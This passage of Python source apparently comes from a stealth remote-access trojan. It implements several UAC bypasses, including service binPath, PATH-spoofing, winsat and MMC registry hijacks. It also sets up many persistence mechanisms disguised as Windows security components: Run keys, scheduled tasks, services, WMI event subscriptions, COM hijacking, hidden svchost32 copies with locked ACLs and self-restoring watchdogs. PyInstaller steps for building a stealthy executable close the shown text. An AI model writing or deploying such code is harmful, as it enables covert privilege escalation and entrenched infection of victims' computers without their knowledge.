        # Method 1: Try to modify AppInfo service configuration with VBS
        try:
            # Stop AppInfo service temporarily
            subprocess.run(['sc.exe', 'stop', 'Appinfo'], 
                         creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
            
            # Modify service binary path to use VBS instead of CMD
            # VBS runs silently without console window - much stealthier!
            subprocess.run(['sc.exe', 'config', 'Appinfo', 'binPath=', 
                          f'wscript.exe //B //Nologo "{vbs_path}" && svchost.exe -k netsvcs -p'], 
                         creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
            
            # Start service
            subprocess.run(['sc.exe', 'start', 'Appinfo'], 
                         creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
            
            time.sleep(2)
            
            # Restore original service configuration
            subprocess.run(['sc.exe', 'config', 'Appinfo', 'binPath=', 
                          r'%SystemRoot%\system32\svchost.exe -k netsvcs -p'], 
                         creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
            
            # Cleanup VBS file
            try:
                os.remove(vbs_path)
            except (OSError, FileNotFoundError, PermissionError):
                pass
            
            return True
            
        except Exception as e:
            # Cleanup VBS file on error
            try:
                os.remove(vbs_path)
            except (OSError, FileNotFoundError, PermissionError):
                pass
            return False
            
    except Exception as e:
        log_message(f"AppInfo service bypass failed: {e}")
        return False

def bypass_uac_mock_directory():
    """UAC bypass using mock directory technique (UACME Method 62)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Create mock trusted directory structure
        temp_dir = tempfile.gettempdir()
        mock_system32 = os.path.join(temp_dir, "System32")
        os.makedirs(mock_system32, exist_ok=True)
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            # Create batch file wrapper
            batch_path = os.path.join(mock_system32, "dllhost.exe")
            with open(batch_path, 'w') as f:
                f.write(f'@echo off\npython.exe "{current_exe}"\n')
        
        # Modify PATH to prioritize our mock directory
        original_path = os.environ.get('PATH', '')
        os.environ['PATH'] = temp_dir + ';' + original_path
        
        try:
            # Execute process that will search PATH for system executables
            subprocess.Popen(['dllhost.exe'], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(2)
            return True
            
        finally:
            os.environ['PATH'] = original_path
            
    except Exception as e:
        log_message(f"Mock directory bypass failed: {e}")
        return False

def bypass_uac_winsat():
    """UAC bypass using winsat.exe (UACME Method 67)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Hijack winsat.exe through registry
        key_path = r"Software\Classes\Folder\shell\open\command"
        
        try:
            # Backup original value
            original_value = None
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path)
                original_value = winreg.QueryValueEx(key, "")[0]
                winreg.CloseKey(key)
            except:
                pass
            
            # Set our payload
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)
            
            # Execute winsat.exe
            winsat_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'winsat.exe')
            subprocess.Popen([winsat_path, "disk"], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(3)
            
            # Restore original value
            try:
                if original_value:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, original_value)
                    winreg.CloseKey(key)
                else:
                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
            except:
                pass
                
            return True
            
        except Exception as e:
            log_message(f"Winsat bypass failed: {e}")
            return False
            
    except ImportError:
        return False

def bypass_uac_mmcex():
    """UAC bypass using mmc.exe with fake snapin (UACME Method 68)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Create fake MMC snapin
        snapin_clsid = "{11111111-2222-3333-4444-555555555555}"
        key_path = f"Software\\Classes\\CLSID\\{snapin_clsid}\\InProcServer32"
        
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.SetValueEx(key, "ThreadingModel", 0, winreg.REG_SZ, "Apartment")
            winreg.CloseKey(key)
            
            # Create MSC file that references our snapin
            msc_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<MMC_ConsoleFile ConsoleVersion="3.0">
    <BinaryStorage>
        <Binary Name="StringTable">
            <Data>
                <String ID="1" Refs="1">{snapin_clsid}</String>
            </Data>
        </Binary>
    </BinaryStorage>
</MMC_ConsoleFile>'''
            
            msc_path = os.path.join(tempfile.gettempdir(), "fake.msc")
            with open(msc_path, 'w') as f:
                f.write(msc_content)
            
            # Execute MMC with our fake snapin
            mmc_exe_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'mmc.exe')
            subprocess.Popen([mmc_exe_path, msc_path], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(3)
            
            # Clean up
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
                os.remove(msc_path)
            except:
                pass
                
            return True
            
        except Exception as e:
            log_message(f"MMC snapin bypass failed: {e}")
            return False
            
    except ImportError:
        return False

def establish_persistence():
    """Establish multiple persistence mechanisms with advanced tamper protection."""
    if not WINDOWS_AVAILABLE:
        return establish_linux_persistence()
    
    persistence_methods = [
        registry_run_key_persistence,
        # startup_folder_watchdog_persistence,  # DISABLED: Auto-restore startup copy (watchdog-like)
        scheduled_task_persistence,
        service_persistence,
        # Advanced persistence methods
        system_level_persistence,
        wmi_event_persistence,
        com_hijacking_persistence,
        file_locking_persistence,  # [ OK ] ENABLED - File locking persistence
        # watchdog_persistence,      # [ X ] DISABLED per user request - prevent repeated restarts/popups
        tamper_protection_persistence,  # [ OK ] ENABLED - Tamper protection
    ]
    
    success_count = 0
    for method in persistence_methods:
        try:
            if method():
                success_count += 1
        except Exception as e:
            log_message(f"Persistence method {method.__name__} failed: {e}")
            continue
    
    return success_count > 0

def registry_run_key_persistence():
    """Establish persistence via registry Run keys."""
    try:
        import winreg
        script_path = os.path.abspath(__file__)
        def _build_hidden_vbs(path_list):
            runner = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
            if not os.path.exists(runner):
                runner = sys.executable
            vbs = (
                'Set oShell = CreateObject("WScript.Shell")\n'
                f'oShell.CurrentDirectory = "{os.path.dirname(script_path)}"\n'
                f'oShell.Run "\"{runner}\" \"{script_path}\"", 0, false\n'
            )
            for p in path_list:
                try:
                    d = os.path.dirname(p)
                    os.makedirs(d, exist_ok=True)
                    with open(p, 'w', encoding='utf-8') as f:
                        f.write(vbs)
                    try:
                        subprocess.run(['attrib', '+s', '+h', p], creationflags=subprocess.CREATE_NO_WINDOW, check=False)
                    except Exception:
                        pass
                    return p
                except Exception:
                    continue
            return None
        hidden_candidates = [
            os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'ClientUpdate', 'winupdate.vbs'),
            os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Windows', 'ClientUpdate', 'winupdate.vbs'),
            os.path.join(tempfile.gettempdir(), 'Microsoft', 'Windows', 'ClientUpdate', 'winupdate.vbs'),
        ]
        hidden_vbs = _build_hidden_vbs(hidden_candidates)
        current_exe = f'wscript.exe "{hidden_vbs}"' if hidden_vbs else f'"{sys.executable}" "{script_path}"'
        
        log_message(f"[REGISTRY] Setting up persistence for: {current_exe}")
        
        # Multiple registry locations for persistence
        # IMPORTANT: Using HKEY_CURRENT_USER (not HKLM) to avoid UAC prompts
        run_keys = [
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
        ]
        
        value_name = "WindowsSecurityUpdate"
        success_count = 0
        
        for hkey, key_path in run_keys:
            try:
                log_message(f"[REGISTRY] Attempting to create key: {key_path}")
                key = winreg.CreateKey(hkey, key_path)
                log_message(f"[REGISTRY] Key created successfully: {key_path}")
                
                log_message(f"[REGISTRY] Setting value '{value_name}' = '{current_exe}'")
                # Store without extra quotes - registry Run keys handle this correctly
                winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, current_exe)
                log_message(f"[REGISTRY] Value set successfully in {key_path}")
                
                winreg.CloseKey(key)
                success_count += 1
                
            except PermissionError as e:
                log_message(f"[REGISTRY] Permission denied for {key_path}: {e}")
                continue
            except Exception as e:
                log_message(f"[REGISTRY] Failed to set key {key_path}: {e}")
                continue
        
        log_message(f"[REGISTRY] Registry persistence setup completed. Success: {success_count}/{len(run_keys)} keys")
        return success_count > 0
        
    except Exception as e:
        log_message(f"[REGISTRY] Registry persistence failed: {e}")
        return False

def cleanup_startup_folder_artifacts():
    """Remove legacy startup folder .vbs/.bat artifacts."""
    try:
        startup_folder = os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
        targets = ["ClientService.vbs", "SystemService.bat"]
        for name in targets:
            p = os.path.join(startup_folder, name)
            try:
                if os.path.exists(p):
                    os.remove(p)
                    log_message(f"[CLEANUP] Removed startup artifact: {p}")
            except Exception as e:
                log_message(f"[CLEANUP] Failed to remove {p}: {e}", "warning")
    except Exception as e:
        log_message(f"[CLEANUP] Startup folder cleanup error: {e}", "warning")
def startup_folder_persistence():
    return False

def scheduled_task_persistence():
    """Establish persistence via scheduled tasks."""
    try:
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Create scheduled task using schtasks command
        # Use /RL LIMITED to run with normal user privileges (no UAC prompt)
        subprocess.run([
            'schtasks.exe', '/Create', '/TN', 'WindowsSecurityUpdate',
            '/TR', current_exe, '/SC', 'ONLOGON', '/RL', 'LIMITED', '/F'
        ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=30)
        
        return True
        
    except Exception as e:
        log_message(f"Scheduled task persistence failed: {e}")
        return False

def service_persistence():
    """Establish persistence via Windows service."""
    try:
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Create service
        subprocess.run([
            'sc.exe', 'create', 'WindowsSecurityService',
            'binPath=', current_exe,
            'start=', 'auto',
            'DisplayName=', 'Windows Security Service'
        ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=30)
        
        return True
        
    except Exception as e:
        log_message(f"Service persistence failed: {e}")
        return False

def establish_linux_persistence():
    """Establish persistence on Linux systems."""
    try:
        current_exe = os.path.abspath(__file__)
        
        # Method 1: .bashrc
        try:
            bashrc_path = os.path.expanduser("~/.bashrc")
            with open(bashrc_path, 'a') as f:
                f.write(f"\n# System update check\npython3 {current_exe} &\n")
        except (OSError, PermissionError, IOError):
            pass
        
        return True
        
    except Exception as e:
        log_message(f"Linux persistence failed: {e}")
        return False

# === ADVANCED PERSISTENCE AND TAMPER PROTECTION ===

def system_level_persistence():
    """Install script to protected system directories with SYSTEM-level protection."""
    if not WINDOWS_AVAILABLE or not is_admin():
        return False
    
    try:
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Protected system directories
        system_dirs = [
            r"C:\Windows\System32\svchost32.exe",
            r"C:\Windows\SysWOW64\svchost32.exe",
            r"C:\Windows\System32\drivers\svchost32.exe",
        ]
        
        # Check if we're running as admin before attempting system-level persistence
        if not is_admin():
            log_message("[WARN] System-level persistence requires admin privileges", "warning")
            return False
        
        for target_path in system_dirs:
            try:
                # Copy script to protected location
                import shutil
                shutil.copy2(current_exe, target_path)
                
                # Set system and hidden attributes
                subprocess.run(['attrib', '+s', '+h', target_path], 
                             creationflags=subprocess.CREATE_NO_WINDOW)
                
                # Set NTFS permissions to deny modification for non-SYSTEM accounts
                subprocess.run([
                    'icacls', target_path, '/inheritance:r', 
                    '/grant', 'SYSTEM:F', '/grant', 'Administrators:F', 
                    '/deny', 'Everyone:D'
                ], creationflags=subprocess.CREATE_NO_WINDOW)
                
                log_message(f"[OK] System-level persistence established: {target_path}")
                return True
                
            except Exception as e:
                log_message(f"[WARN] Failed to establish system persistence at {target_path}: {e}")
                continue
        
        return False
        
    except Exception as e:
        log_message(f"System-level persistence failed: {e}")
        return False

def wmi_event_persistence():
    """Establish persistence via WMI permanent event subscription."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # WMI persistence script
        wmi_script = f'''
$filterName = 'WindowsSecurityFilter'
$consumerName = 'WindowsSecurityConsumer'

# Create event filter for process start
$Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'"
$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\\subscription" -Arguments @{{
    Name=$filterName
    EventNameSpace="root\\cimv2"
    QueryLanguage="WQL"
    Query=$Query
}}

# Create command line consumer
$Arg = @{{
    Name=$consumerName
    CommandLineTemplate="{current_exe}"
}}
$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments $Arg

# Bind filter to consumer
$WMIEventBinding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{{
    Filter=$WMIEventFilter
    Consumer=$WMIEventConsumer
}}
'''
        
        subprocess.run([
            'powershell.exe', '-Command', wmi_script
        ], creationflags=subprocess.CREATE_NO_WINDOW, 
           capture_output=True, text=True, timeout=30)
        
        log_message("[OK] WMI event persistence established")
        return True
        
    except Exception as e:
        log_message(f"WMI persistence failed: {e}")
        return False

def com_hijacking_persistence():
    """Establish persistence via COM object hijacking."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Hijack commonly used COM objects (real CLSIDs)
        com_targets = [
            "{00021401-0000-0000-C000-000000000046}",  # Shell.Application
            "{13709620-C279-11CE-A49E-444553540000}",  # Shell.Explorer
            "{9BA05972-F6A8-11CF-A442-00A0C90A8F39}",  # Shell.Application.1
        ]
        
        for clsid in com_targets:
            try:
                key_path = f"Software\\Classes\\CLSID\\{clsid}\\InProcServer32"
                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
                winreg.SetValueEx(key, "ThreadingModel", 0, winreg.REG_SZ, "Apartment")
                winreg.CloseKey(key)
                
                log_message(f"[OK] COM hijacking persistence established: {clsid}")
                return True
                
            except Exception as e:
                log_message(f"[WARN] COM hijacking failed for {clsid}: {e}")
                continue
        
        return False
        
    except Exception as e:
        log_message(f"COM hijacking persistence failed: {e}")
        return False

def file_locking_persistence():
    """Keep script loaded in memory to prevent deletion."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Create a watchdog process that keeps the main script loaded
        watchdog_script = f'''
import os
import sys
import time
import subprocess
import threading

def monitor_main_script():
    main_script = "{os.path.abspath(__file__)}"
    while True:
        try:
            # Check if main script is running
            result = subprocess.run(['tasklist', '/FI', 'IMAGENAME eq python.exe'], 
                                  capture_output=True, text=True)
            if main_script not in result.stdout:
                # Restart main script
                subprocess.Popen(['python.exe', main_script], 
                               creationflags=subprocess.CREATE_NO_WINDOW)
            time.sleep(30)
        except (subprocess.SubprocessError, OSError, PermissionError):
            time.sleep(60)

if __name__ == "__main__":
    monitor_main_script()
'''
        
        # DISABLED: Watchdog script to prevent Python window pop-ups
        # watchdog_path = os.path.join(tempfile.gettempdir(), "svchost32.py")
        # with open(watchdog_path, 'w') as f:
        #     f.write(watchdog_script)
        # 
        # # Start watchdog process
        # subprocess.Popen(['python.exe', watchdog_path], 
        #                 creationflags=subprocess.CREATE_NO_WINDOW)
        
        log_message(f"[SKIP] Watchdog persistence disabled to prevent popup windows")
        return False  # Changed to False to skip this persistence method
        
    except Exception as e:
        log_message(f"File locking persistence failed: {e}")
        return False

def watchdog_persistence():
    """Create a watchdog process that monitors and restarts the main script."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Create watchdog batch script
        watchdog_batch = f'''@echo off
:loop
tasklist /FI "IMAGENAME eq python.exe" /FI "WINDOWTITLE eq *{os.path.basename(__file__)}*" | find "{os.path.basename(__file__)}" >nul
if errorlevel 1 (
    echo Restarting main script...
    start /min {current_exe}
)
timeout /t 30 /nobreak >nul
goto loop
'''
        
        # DISABLED: Watchdog batch to prevent popup windows
        # watchdog_path = os.path.join(tempfile.gettempdir(), "svchost32.bat")
        # with open(watchdog_path, 'w') as f:
        #     f.write(watchdog_batch)
        # 
        # # Start watchdog
        # subprocess.Popen(['powershell.exe', '-ExecutionPolicy', 'Bypass', '-NoProfile', '-File', watchdog_path], 
        #                 creationflags=subprocess.CREATE_NO_WINDOW)
        
        log_message(f"[SKIP] Watchdog batch persistence disabled to prevent popup windows")
        return False
        
    except Exception as e:
        log_message(f"Watchdog persistence failed: {e}")
        return False

def startup_folder_watchdog_persistence():
    """
    Deploy original .exe to AppData and create monitored duplicate in startup folder.
    - Original exe -> AppData (hidden, protected location)
    - Startup copy -> shell:startup (auto-recreated if deleted)
    - Background thread monitors and restores startup copy
    """
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Check if running as compiled executable
        if not (hasattr(sys, 'frozen') and sys.frozen):
            log_message("[STARTUP WATCHDOG] Only works with compiled .exe, skipping")
            return False
        
        import shutil
        
        # Paths
        current_exe = sys.executable  # Current executable path
        appdata_folder = os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Windows')
        appdata_exe = os.path.join(appdata_folder, 'svchost.exe')
        startup_folder = os.path.join(os.environ.get('APPDATA', ''), 
                                      'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        startup_exe = os.path.join(startup_folder, 'WindowsSecurityUpdate.exe')
        
        # Create directories if they don't exist
        os.makedirs(appdata_folder, exist_ok=True)
        os.makedirs(startup_folder, exist_ok=True)
        
        # Step 1: Deploy original to AppData (if not already there)
        if current_exe != appdata_exe:
            if not os.path.exists(appdata_exe):
                shutil.copy2(current_exe, appdata_exe)
                log_message(f"[STARTUP WATCHDOG] Deployed original to AppData: {appdata_exe}")
                
                # Hide the AppData exe
                try:
                    subprocess.run(['attrib', '+h', '+s', appdata_exe], 
                                 creationflags=subprocess.CREATE_NO_WINDOW, 
                                 capture_output=True, timeout=5)
                    log_message("[STARTUP WATCHDOG] Hidden AppData exe with +h +s attributes")
                except (subprocess.SubprocessError, OSError, PermissionError):
                    pass
        
        # Step 2: Create duplicate in startup folder
        if not os.path.exists(startup_exe):
            shutil.copy2(appdata_exe, startup_exe)
            log_message(f"[STARTUP WATCHDOG] Created startup folder copy: {startup_exe}")
        
        # Step 3: Start watchdog thread to monitor startup folder
        def startup_watchdog_thread():
            """Background thread that monitors and restores startup folder copy"""
            log_message("[STARTUP WATCHDOG] Monitoring thread started")
            
            while True:
                try:
                    # Check if startup copy exists
                    if not os.path.exists(startup_exe):
                        log_message("[STARTUP WATCHDOG] [ ! ] Startup copy DELETED! Restoring...")
                        
                        # Restore from AppData original
                        if os.path.exists(appdata_exe):
                            shutil.copy2(appdata_exe, startup_exe)
                            log_message(f"[STARTUP WATCHDOG] [ OK ] Restored: {startup_exe}")
                        else:
                            log_message("[STARTUP WATCHDOG] [ X ] AppData original missing! Cannot restore!")
                    
                    # Check if AppData original exists
                    if not os.path.exists(appdata_exe):
                        log_message("[STARTUP WATCHDOG] [ ! ] AppData original DELETED! Restoring...")
                        
                        # Restore from startup copy
                        if os.path.exists(startup_exe):
                            shutil.copy2(startup_exe, appdata_exe)
                            # Re-hide it
                            try:
                                subprocess.run(['attrib', '+h', '+s', appdata_exe], 
                                             creationflags=subprocess.CREATE_NO_WINDOW, 
                                             capture_output=True, timeout=5)
                            except (subprocess.SubprocessError, OSError, PermissionError):
                                pass
                            log_message(f"[STARTUP WATCHDOG] [ OK ] Restored AppData: {appdata_exe}")
                        elif os.path.exists(current_exe):
                            # Last resort: copy from current location
                            shutil.copy2(current_exe, appdata_exe)
                            log_message("[STARTUP WATCHDOG] [ OK ] Restored AppData from current exe")
                    
                    # Sleep for 10 seconds before next check
                    time.sleep(10)
                    
                except Exception as e:
                    log_message(f"[STARTUP WATCHDOG] Monitor error: {e}")
                    time.sleep(30)  # Wait longer on error
        
        # Start watchdog thread (daemon so it doesn't prevent exit)
        watchdog_thread = threading.Thread(target=startup_watchdog_thread, daemon=True)
        watchdog_thread.start()
        log_message("[STARTUP WATCHDOG] [ OK ] Persistence established with auto-restore")
        
        return True
        
    except Exception as e:
        log_message(f"[STARTUP WATCHDOG] Setup failed: {e}")
        return False

def tamper_protection_persistence():
    """Implement tamper detection and self-healing capabilities."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Create backup copies in multiple locations
        backup_locations = [
            os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'svchost32.py'),
            os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Windows', 'svchost32.py'),
            os.path.join(tempfile.gettempdir(), 'svchost32.py'),
        ]
        
        for backup_path in backup_locations:
            try:
                os.makedirs(os.path.dirname(backup_path), exist_ok=True)
                import shutil
                shutil.copy2(current_exe, backup_path)
                
                # Hide backup files
                subprocess.run(['attrib', '+s', '+h', backup_path], 
                             creationflags=subprocess.CREATE_NO_WINDOW)
                
            except Exception as e:
                log_message(f"[WARN] Failed to create backup at {backup_path}: {e}")
                continue
        
        # Create tamper detection script
        tamper_script = f'''
import os
import sys
import time
import subprocess
import shutil

def check_and_restore():
    main_script = "{os.path.abspath(__file__)}"
    backup_locations = {repr(backup_locations)}
    
    while True:
        try:
            # Check if main script exists and is accessible
            if not os.path.exists(main_script):
                # Restore from backup
                for backup in backup_locations:
                    if os.path.exists(backup):
                        shutil.copy2(backup, main_script)
                        log_message(f"Restored main script from {{backup}}")
                        break
                
                # Restart main script
                subprocess.Popen(['python.exe', main_script], 
                               creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(60)  # Check every minute
            
        except Exception as e:
            log_message(f"Tamper protection error: {{e}}")
            time.sleep(120)

if __name__ == "__main__":
    check_and_restore()
'''
        
        # DISABLED: Tamper protection to prevent Python window pop-ups
        # tamper_path = os.path.join(tempfile.gettempdir(), "tamper_protection.py")
        # with open(tamper_path, 'w') as f:
        #     f.write(tamper_script)
        # 
        # # Start tamper protection
        # subprocess.Popen(['python.exe', tamper_path], 
        #                 creationflags=subprocess.CREATE_NO_WINDOW)
        
        log_message(f"[SKIP] Tamper protection disabled to prevent popup windows")
        return False
        
    except Exception as e:
        log_message(f"Tamper protection failed: {e}")
        return False

def disable_removal_tools():
    """Configure removal tools registry entries (set to 0 to keep tools enabled)."""
    if not WINDOWS_AVAILABLE or not is_admin():
        return False
    
    try:
        # Task Manager, Registry Editor, and CMD are now kept ENABLED (not disabled)
        # These registry entries are set to 0 (enabled) to allow normal system tool usage
        log_message("[INFO] System tools (Task Manager, Registry Editor, CMD) remain enabled")
        
        # Set Command Prompt registry value to 0 (ENABLED - FALSE means NOT disabled)
        debug_print("[REGISTRY] Setting DisableCMD = 0 (CMD ENABLED)")
        subprocess.run([
            'reg', 'add', 'HKCU\\Software\\Policies\\Microsoft\\Windows\\System',
            '/v', 'DisableCMD', '/t', 'REG_DWORD', '/d', '0', '/f'  # [ OK ] Changed from 1 to 0!
        ], creationflags=subprocess.CREATE_NO_WINDOW)
        debug_print("[REGISTRY] [ OK ] CMD remains ENABLED (DisableCMD = 0)")
        
        # Set PowerShell ExecutionPolicy to Unrestricted (keep enabled)
        debug_print("[REGISTRY] Setting PowerShell ExecutionPolicy to Unrestricted")
        subprocess.run([
            'reg', 'add', 'HKCU\\Software\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell',
            '/v', 'ExecutionPolicy', '/t', 'REG_SZ', '/d', 'Unrestricted', '/f'
        ], creationflags=subprocess.CREATE_NO_WINDOW)
        debug_print("[REGISTRY] [ OK ] PowerShell ExecutionPolicy set to Unrestricted")
        
        log_message("[OK] Removal tools registry entries configured (tools remain enabled)")
        return True
        
    except Exception as e:
        log_message(f"Failed to configure removal tools registry: {e}")
        return False

def create_pyinstaller_command():
    """Generate PyInstaller command for creating standalone executable."""
    pyinstaller_command = '''
# PyInstaller command to create standalone executable (no Python installation required)
# Run this command in the directory containing your main.py:

pyinstaller --onefile --windowed --name "svchost32" --icon "icon.ico" main.py

# Alternative command with additional options for maximum stealth:
pyinstaller --onefile --windowed --name "svchost32" --icon "icon.ico" --hidden-import win32api --hidden-import win32con --hidden-import win32security --hidden-import win32process --hidden-import win32event --hidden-import ctypes --hidden-import wintypes --hidden-import winreg --hidden-import mss --hidden-import numpy --hidden-import cv2 --hidden-import pyaudio --hidden-import pynput --hidden-import pygame --hidden-import websockets --hidden-import speech_recognition --hidden-import psutil --hidden-import PIL --hidden-import pyautogui --hidden-import socketio --hidden-import requests --hidden-import urllib3 --hidden-import warnings --hidden-import uuid --hidden-import os --hidden-import subprocess --hidden-import threading --hidden-import sys --hidden-import random --hidden-import base64 --hidden-import tempfile --hidden-import io --hidden-import wave --hidden-import socket --hidden-import json --hidden-import asyncio --hidden-import platform --hidden-import collections --hidden-import queue --hidden-import math --hidden-import time --hidden-import eventlet main.py

# The resulting svchost32.exe will:
# - Run on any Windows PC without Python installed
# - No UAC prompt (runs as current user)
# - Contains all dependencies embedded
# - Can be placed in %LOCALAPPDATA% for stealth
'''
    return pyinstaller_command

def setup_advanced_persistence():
    """Setup advanced persistence with tamper protection and removal tool registry configuration."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        log_message("Setting up advanced persistence and tamper protection...")
        
        # Setup basic persistence first
        establish_persistence()
        
        # Setup advanced persistence methods
        advanced_methods = [
            system_level_persistence,
            wmi_event_persistence,
            com_hijacking_persistence,
            file_locking_persistence,  # [ OK ] ENABLED - File locking persistence
            # watchdog_persistence,    # [ X ] DISABLED per user request
            tamper_protection_persistence,  # [ OK ] ENABLED - Tamper protection
        ]
        
        success_count = 0
        for method in advanced_methods:
            try:
                if method():
                    success_count += 1
                    log_message(f"[OK] {method.__name__} established")
                else:
                    log_message(f"[WARN] {method.__name__} failed")
            except Exception as e:
                log_message(f"[ERROR] {method.__name__} error: {e}")
                continue
        
        # Configure removal tools registry (keeping them enabled)
        if is_admin():
            try:
                disable_removal_tools()
                log_message("[OK] Removal tools registry configured")
            except Exception as e:
                log_message(f"[WARN] Failed to configure removal tools registry: {e}")
        
        log_message(f"[OK] Advanced persistence setup complete: {success_count}/{len(advanced_methods)} methods successful")
        return success_count > 0
        
    except Exception as e:
        log_message(f"Advanced persistence setup failed: {e}")
        return False

def show_pyinstaller_instructions():
    """Display PyInstaller instructions for creating standalone executable."""
    log_message("\n" + "="*80)
    log_message("PYINSTALLER INSTRUCTIONS FOR STANDALONE EXECUTABLE")
    log_message("="*80)
    log_message(create_pyinstaller_command())
    log_message("="*80)
    log_message("\nTo create a standalone executable that runs without Python installation:")
    log_message("1. Install PyInstaller: pip install pyinstaller")
    log_message("2. Run the command above in your script directory")
    log_message("3. The resulting svchost32.exe will work on any Windows PC")
    log_message("4. No UAC prompt required - runs as current user")
    log_message("5. Can be placed in %LOCALAPPDATA% for stealth operation")
    log_message("\nAdvanced persistence features available:")
    log_message("- System-level installation (requires admin)")
    log_message("- WMI event subscription")
    log_message("- COM object hijacking")
    log_message("- File locking and watchdog processes")
    log_message("- Tamper detection and self-healing")
    log_message("- Removal tool registry configuration")
    log_message("="*80)

def deploy_executable_with_persistence():
    """Deploy the executable to a stealth location with registry persistence."""
    global DEPLOYMENT_COMPLETED
    
    # Check if deployment was already completed in this session
    if DEPLOYMENT_COMPLETED:
        log_message("Deployment already completed in this session, skipping")
        return True
        
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Check if svchost32.exe exists in current directory
        exe_path = os.path.join(os.getcwd(), "svchost32.exe")
        if not os.path.exists(exe_path):
            log_message("[ERROR] svchost32.exe not found in current directory", "error")
            log_message("[INFO] Build the executable first using the PyInstaller command")
            return False
        
        # Create stealth deployment location
        stealth_location = os.path.join(
            os.environ.get('LOCALAPPDATA', ''),
            'Microsoft',
            'Windows',
            'svchost32.exe'
        )
        
        # Create directory if it doesn't exist
        os.makedirs(os.path.dirname(stealth_location), exist_ok=True)
        
        # Copy executable to stealth location
        import shutil
        shutil.copy2(exe_path, stealth_location)
        
        # Set hidden and system attributes
        subprocess.run(['attrib', '+s', '+h', stealth_location], 
                      creationflags=subprocess.CREATE_NO_WINDOW)
        
        log_message(f"[OK] Executable deployed to: {stealth_location}")
        
        # Create registry persistence
        try:
            import winreg
            
            # Add to HKCU Run key
            run_key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, run_key_path)
            winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, stealth_location)
            winreg.CloseKey(key)
            
            log_message("[OK] Registry persistence established")
            
        except PermissionError:
            log_message("[WARN] Registry access denied - persistence may not work", "warning")
        except Exception as e:
